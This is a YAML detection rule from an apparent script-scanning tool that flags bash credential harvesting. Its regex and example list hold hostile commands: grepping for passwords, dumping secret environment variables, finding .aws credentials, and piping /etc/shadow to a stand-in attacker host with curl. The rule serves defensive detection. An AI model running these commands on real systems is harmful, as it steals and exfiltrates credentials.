# Bash Pattern: Password and Credential Harvesting
# Detects attempts to harvest passwords from files

id: BASH-007
name: Password and Credential Harvesting
description: |
  Detects attempts to search for and extract passwords or credentials from
  configuration files, environment variables, and common credential storage
  locations. Attackers grep for passwords in files, dump environment variables,
  and search common credential locations.
languages:
  - bash
detection_type: regex
detection_logic: '(?:grep.*-r.*(?:password|passwd|pwd|credential)|cat.*(?:/etc/shadow)(?!.*awk)|cat.*(?:/etc/passwd).*(?:curl|wget|nc|base64|xxd)|env\s*\|\s*grep.*(?:PASS|KEY|TOKEN|SECRET)|find.*-name.*(?:\.aws|\.docker|\.kube))'
severity: Critical
mitre_technique: T1552.001
confidence: 0.85
category: credential_access
enabled: true
metadata:
  author: Script Sentinel Team
  created: "2025-11-17"
  updated: "2025-11-17"
  references:
    - "https://attack.mitre.org/techniques/T1552/001/"
    - "https://attack.mitre.org/techniques/T1552/"
  tags:
    - bash
    - credential-harvesting
    - password-theft
    - reconnaissance
  examples:
    - "grep -r 'password' /home/ 2>/dev/null"
    - "cat /etc/shadow | curl -X POST http://attacker.com/creds"
    - "env | grep -i 'pass\\|key\\|token\\|secret'"
    - "find / -name '.aws' -o -name 'credentials' 2>/dev/null"